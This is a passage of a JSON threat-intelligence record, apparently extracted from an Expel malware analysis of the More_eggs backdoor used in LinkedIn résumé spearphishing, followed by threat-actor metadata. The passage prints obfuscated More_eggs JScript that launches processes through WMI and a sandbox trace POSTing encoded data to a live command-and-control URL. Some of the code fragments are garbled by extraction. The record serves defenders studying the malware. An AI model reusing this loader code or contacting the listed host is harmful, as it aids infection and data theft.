0);if (lgnsyjcm857 !== 0) {lgnsyjcm88;}} catch (lgnsyjcm54)\n{try{lgnsyjcm4797.Run(lgnsyjcm449, 1, 0);lgnsyjcm348 = 1;} catch (lgnsyjcm84) {lgnsyjcm348 = 0;}}}}try {if (lgnsyjcm8\n&& lgnsyjcm4 && lgnsyjcm3700 && lgnsyjcm9469){lgnsyjcm400();}} catch (lgnsyjcm39){var lgnsyjcm979 = 0;} }\n\n```\n\n-----\n\n### ppe d\n\n```\nreturn lgnsyjcm2900.length;\n\n```\n```\n…\n\n```\n```\nvar lgnsyjcm963;\n\n```\n\n-----\n\n```\n}\nfunction lgnsyjcm206() {\nvar lgnsyjcm681;\nvar lgnsyjcm4718;\ntry {\nlgnsyjcm681 = lgnsyjcm15(lgnsyjcm2656(\"EdT:2)?+6**kP>Yj\", lgnsyjcm8, lgnsyjcm4));\nlgnsyjcm4718 = lgnsyjcm681.RegRead(lgnsyjcm2656(\"rz%I07urKoW0mJVbfPQ=}Kp;]cNjAFcRVlW#ckgw7%I>\n(,I5,dv&KR/,^kH+9*p=/6*dFQ+mC2T|j[,;T)+FE\", lgnsyjcm8, lgnsyjcm4));\nif (!lgnsyjcm4718) {\n\n```\n```\nif (lgnsyjcm4677(lgnsyjcm3700, lgnsyjcm7220, lgnsyjcm8, lgnsyjcm4, 0) === 1) {\nvar lgnsyjcm012 = lgnsyjcm118 + lgnsyjcm7220 + lgnsyjcm118;\nvar lgnsyjcm24 = 0;\ntry {\nvar lgnsyjcm554 = GetObject(lgnsyjcm2656('Zu%Fr>p+*kGN{~bq\"/E>+Nw6z/OE/aRQ9O<NPg&]IU/7|PH5p0Wl~f5[}sI&<YL_Sn&Gl',\nlgnsyjcm8, lgnsyjcm4));\n\n```\n```\nvar lgnsyjcm0750 = lgnsyjcm206();\nif (lgnsyjcm0750) {\n\n```\n```\nvar lgnsyjcm377 = lgnsyjcm554.Get(lgnsyjcm2656(\"_t&yfpEx4[HY]Vhr\", lgnsyjcm8, lgnsyjcm4)).Create(lgnsyjcm0750 + \" \"\n+ lgnsyjcm012, null, null, 0);\nif (lgnsyjcm377 !== 0) {\n\n```\n```\nif (lgnsyjcm4677(lgnsyjcm20, lgnsyjcm337, lgnsyjcm8, lgnsyjcm4, 1) === 1) {\nlgnsyjcm20 = \"\";\nvar lgnsyjcm348 = 0;\nlgnsyjcm449 = lgnsyjcm2656(lgnsyjcm743, lgnsyjcm8, lgnsyjcm4) + lgnsyjcm118 + lgnsyjcm337 + lgnsyjcm118;\ntry {\nvar lgnsyjcm897 = GetObject(lgnsyjcm2656('Zu%Fr>p+*kGN{~bq\"/E>+Nw6z/OE/aRQ9O<NPg&]IU/7|PH5p0Wl~f5[}sI&<YL_Sn&Gl',\nlgnsyjcm8, lgnsyjcm4));\n\n```\n```\nvar lgnsyjcm857 = lgnsyjcm897 Get(lgnsyjcm2656(\" t&yfpEx4[HY]Vhr\" lgnsyjcm8 lgnsyjcm4)) Create(lgnsyjcm449 null\n\n```\n\n-----\n\n```\n , );\nif (lgnsyjcm857 !== 0) {\nlgnsyjcm88;\n}\n} catch (lgnsyjcm54) {\ntry {\nlgnsyjcm4797.Run(lgnsyjcm449, 1, 0);\nlgnsyjcm348 = 1;\n} catch (lgnsyjcm84) {\nlgnsyjcm348 = 0;\n}\n}\n}\n}\ntry {\nlgnsyjcm400();\n\n```\n\n### Appendix C\n```\n\"https://login.webdirectoryuk.com/63592579468/h1b5gr\"\nScript Content:\nISWbemObjectEx._01800001();\nISWbemObjectEx._01800001();\nISWbemObjectEx._01800001();\nISWbemObjectEx._01800001();\nISWbemObjectEx._01800001();\nISWbemObjectEx._01800001();\nISWbemObjectEx._01800001();\nISWbemObjectEx._01800001();\nISWbemObjectEx._01800001();\nISWbemObjectEx._01800001();\nISWbemObjectEx._01800001();\nISWbemObjectEx._01800001();\nISWbemObjectEx._01800001();\nISWbemObjectEx._01800001();\nIFileSystem3.GetFile(\"C:\\windows\\notepad.exe\");\nIFile.DateCreated();\nIServerXMLHTTPRequest2.open(\"POST\", \"https://login.webdirectoryuk.com/63592579468/h1b5gr\", \"false\");\nIServerXMLHTTPRequest2.onreadystatechange(\"Unsupported parameter type 00000009\");\nIServerXMLHTTPRequest2.send(\"xfb_5!)#!@Z%NoXq|eT&EU_1kbTVFS;,i25oU/wYT^m&QmY.A!o8=n<|*54VFJmd<Tr|lZOK`^KxVd5JDm\"1O^K43a\n<cG$&Kj^^CsqG/[Y[8zE7%ARJ4iw0,]gEHB8,:l@PUOvxBhoK=qY81rH{d#[^GRcR(*Ql8C\");\nISWbemLocator.ConnectServer(\".\", \"root\\cimv2\");\n\n```\n```\nISWbemObjectEx._01800001();\nISWbemObjectEx._01800002();\nISWbemServicesEx.ExecNotificationQuery(\"SELECT * FROM __InstanceDeletionEvent Within 1 Where TargetInstance ISA\n'Win32_Process'\");\n\n```\n```\nISWbemEventSource.NextEvent();\nISWbemObjectEx._01800001();\n\n```\n```\nISWbemEventSource.NextEvent();\n\n```\n\n-----\n\n```\nIServerXMLHTTPRequest2.onreadystatechange(\"Unsupported parameter type 00000009\");\nIServerXMLHTTPRequest2.send(\"\n<D,U`u/xe$a#J@f|*jit[BG8)>__]sXf.m7hF%}J|>]$s{GZoxnY@u1L;QU1StQfp.T.z}QOR{MZLpjBTmGO5`@]!$:5*Pp6avAY,O9bRTN%k%X,F*^KdaAu\n[:~#o5oT~BlJCFft~uo>R*O9h1=YUB#Z\");\n\n#### Subscribe\n\n Managed Phishing Service\n\n Expel's Phishing Service is designed to stop data breaches before they happen. It's time to take your security seriously and protect yourself from the next data breach.\n\n Read More\n\n```\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-08-25 - MORE_EGGS and Some LinkedIn Resumé Spearphishing.pdf"
+    ],
+    "report_names": [
+        "2022-08-25 - MORE_EGGS and Some LinkedIn Resumé Spearphishing.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "059b16f8-d4e0-4399-9add-18101a2fd298",
+            "created_at": "2022-10-25T15:50:23.29434Z",
+            "updated_at": "2025-03-27T02:00:55.431907Z",
+            "deleted_at": null,
+            "main_name": "Evilnum",
+            "aliases": [
+                "Evilnum"
+            ],
+            "source_name": "MITRE:Evilnum",
+            "tools": [
+                "More_eggs",
+                "EVILNUM",
+                "LaZagne"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "39ea99fb-1704-445d-b5cd-81e7c99d6012",
+            "created_at": "2022-10-25T16:07:23.601894Z",
+            "updated_at": "2025-03-27T02:02:09.882982Z",
+            "deleted_at": null,
+            "main_name": "Evilnum",
+            "aliases": [
+                "Jointworm",
+                "Operation Phantom in the [Command] Shell",
+                "TA4563"
+            ],
+            "source_name": "ETDA:Evilnum",
+            "tools": [
+                "Bypass-UAC",
+                "Cardinal RAT",
+                "ChromeCookiesView",
+                "EVILNUM",
+                "Evilnum",
+                "IronPython",
+                "LaZagne",
+                "MailPassView",
+                "More_eggs",
+                "ProduKey",
+                "PyVil",
+                "PyVil RAT",
+                "SONE",
+                "SpicyOmelette",
+                "StealerOne",
+                "Taurus Loader Stealer Module",
+                "Taurus Loader TeamViewer Module",
+                "Terra Loader",
+                "TerraPreter",
+                "TerraStealer",
+                "TerraTV"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
+            "created_at": "2022-10-25T16:07:23.773944Z",
+            "updated_at": "2025-03-27T02:02:09.974695Z",
+            "deleted_at": null,
+            "main_name": "Lead",
+            "aliases": [
+                "Casper",
+                "TG-3279"
+            ],
+            "source_name": "ETDA:Lead",
+            "tools": [
+                "Agentemis",
+                "BleDoor",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "RbDoor",
+                "RibDoor",
+                "Winnti",
+                "cobeacon"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "610a7295-3139-4f34-8cec-b3da40add480",
+            "created_at": "2023-01-06T13:46:38.608142Z",
+            "updated_at": "2025-03-27T02:00:02.87217Z",
+            "deleted_at": null,
+            "main_name": "Cobalt",
+            "aliases": [
+                "Cobalt Gang",
+                "GOLD KINGSWOOD",
+                "COBALT SPIDER",
+                "G0080",
+                "Mule Libra",
+                "Cobalt Group"
+            ],
+            "source_name": "MISPGALAXY:Cobalt",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "2dfaa730-7079-494c-b2f0-3ff8f3598a51",
+            "created_at": "2022-10-25T16:07:23.474746Z",
+            "updated_at": "2025-03-27T02:02:09.822683Z",
+            "deleted_at": null,
+            "main_name": "Cobalt Group",
+            "aliases": [
+                "ATK 67",
+                "Cobalt Gang",
+                "Cobalt Spider",
+                "Gold Kingswood",
+                "Mule Libra",
+                "TAG-CR3"
+            ],
+            "source_name": "ETDA:Cobalt Group",
+            "tools": [
+                "ATMRipper",
+                "ATMSpitter",
+                "Agentemis",
+                "AmmyyRAT",
+                "AtNow",
+                "COOLPANTS",
+                "CobInt",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "Cyst Downloader",
+                "Fareit",
+                "FlawedAmmyy",
+                "Formbook",
+                "Little Pig",
+                "Metasploit Stager",
+                "Mimikatz",
+                "More_eggs",
+                "NSIS",
+                "Nullsoft Scriptable Install System",
+                "Pony Loader",
+                "Ripper ATM",
+                "SDelete",
+                "Siplog",
+                "SoftPerfect Network Scanner",
+                "SpicyOmelette",
+                "Taurus Builder",
+                "Taurus Builder Kit",
+                "Taurus Loader",
+                "Terra Loader",
+                "ThreatKit",
+                "VenomKit",
+                "cobeacon",
+                "win.xloader"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "ee3363a4-e807-4f95-97d8-b603c31b9de1",
+            "created_at": "2023-01-06T13:46:38.485884Z",
+            "updated_at": "2025-03-27T02:00:02.845851Z",
+            "deleted_at": null,
+            "main_name": "FIN6",
+            "aliases": [
+                "Camouflage Tempest",
+                "MageCart Group 6",
+                "G0037",
+                "TA4557",
+                "SKELETON SPIDER",
+                "ITG08",
+                "White Giant",
+                "GOLD FRANKLIN",
+                "ATK88"
+            ],
+            "source_name": "MISPGALAXY:FIN6",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "12517c87-040a-4627-a3df-86ca95e5c13f",
+            "created_at": "2022-10-25T16:07:23.61665Z",
+            "updated_at": "2025-03-27T02:02:09.889471Z",
+            "deleted_at": null,
+            "main_name": "FIN6",
+            "aliases": [
+                "ATK 88",
+                "Camouflage Tempest",
+                "FIN6",
+                "Gold Franklin",
+                "ITG08",
+                "Skeleton Spider",
+                "TAAL",
+                "TAG-CR2",
+                "White Giant"
+            ],
+            "source_name": "ETDA:FIN6",
+            "tools": [
+                "AbaddonPOS",
+                "Agentemis",
+                "AmmyyRAT",
+                "Anchor_DNS",
+                "BlackPOS",
+                "CmdSQL",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "FlawedAmmyy",
+                "FrameworkPOS",
+                "Grateful POS",
+                "JSPSPY",
+                "Kaptoxa",
+                "LOLBAS",
+                "LOLBins",
+                "Living off the Land",
+                "LockerGoga",
+                "MMon",
+                "Magecart",
+                "Meterpreter",
+                "Mimikatz",
+                "More_eggs",
+                "NeverQuest",
+                "POSWDS",
+                "Reedum",
+                "Ryuk",
+                "SCRAPMINT",
+                "SONE",
+                "SpicyOmelette",
+                "StealerOne",
+                "Taurus Loader Stealer Module",
+                "Terra Loader",
+                "TerraStealer",
+                "Vawtrak",
+                "WCE",
+                "Windows Credential Editor",
+                "Windows Credentials Editor",
+                "cobeacon",
+                "grabnew"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "8ce861d7-7fbd-4d9c-a211-367c118bfdbd",
+            "created_at": "2023-01-06T13:46:39.153487Z",
+            "updated_at": "2025-03-27T02:00:03.009422Z",
+            "deleted_at": null,
+            "main_name": "Evilnum",
+            "aliases": [
+                "TA4563",
+                "EvilNum",
+                "Jointworm",
+                "KNOCKOUT SPIDER",
+                "DeathStalker"
+            ],
+            "source_name": "MISPGALAXY:Evilnum",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "b3acfb48-b04d-4d3d-88a8-836d7376fa2e",
+            "created_at": "2024-06-19T02:03:08.052814Z",
+            "updated_at": "2025-03-27T02:05:17.368029Z",
+            "deleted_at": null,
+            "main_name": "GOLD FRANKLIN",
+            "aliases": [
+                "ITG08 ",
+                "MageCart Group 6 ",
+                "Skeleton Spider ",
+                "White Giant ",
+                "FIN6 "
+            ],
+            "source_name": "Secureworks:GOLD FRANKLIN",
+            "tools": [
+                " Metasploit",
+                " Meterpreter",
+                " Mimikatz",
+                " PowerSploit",
+                " PowerUpSQL",
+                " RemCom",
+                "FrameWorkPOS"
+            ],
+            "source_id": "Secureworks",
+            "reports": null
+        },
+        {
+            "id": "ea7bfe06-7c23-481d-b8ba-eafa6cda3bc9",
+            "created_at": "2022-10-25T15:50:23.317961Z",
+            "updated_at": "2025-03-27T02:00:55.440858Z",
+            "deleted_at": null,
+            "main_name": "FIN6",
+            "aliases": [
+                "FIN6",
+                "Magecart Group 6",
+                "ITG08",
+                "Skeleton Spider",
+                "TAAL",
+                "Camouflage Tempest"
+            ],
+            "source_name": "MITRE:FIN6",
+            "tools": [
+                "FlawedAmmyy",
+                "GrimAgent",
+                "FrameworkPOS",
+                "More_eggs",
+                "Cobalt Strike",
+                "Windows Credential Editor",
+                "AdFind",
+                "PsExec",
+                "LockerGoga",
+                "Ryuk",
+                "Mimikatz"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "c11abba0-f5e8-4017-a4ee-acb1a7c8c242",
+            "created_at": "2022-10-25T15:50:23.744036Z",
+            "updated_at": "2025-03-27T02:00:55.537114Z",
+            "deleted_at": null,
+            "main_name": "Cobalt Group",
+            "aliases": [
+                "Cobalt Group",
+                "GOLD KINGSWOOD",
+                "Cobalt Gang",
+                "Cobalt Spider"
+            ],
+            "source_name": "MITRE:Cobalt Group",
+            "tools": [
+                "Mimikatz",
+                "More_eggs",
+                "SpicyOmelette",
+                "SDelete",
+                "Cobalt Strike",
+                "PsExec"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535854,
+    "ts_updated_at": 1743041768,
+    "ts_creation_date": 1662028268,
+    "ts_modification_date": 1662028268,
+    "files": {
+        "pdf": "https://archive.orkl.eu/1f27707236d78170395f428770f877f5fd224125.pdf",
+        "text": "https://archive.orkl.eu/1f27707236d78170395f428770f877f5fd224125.txt",
+        "img": "https://archive.orkl.eu/1f27707236d78170395f428770f877f5fd224125.jpg"
+    }
+}
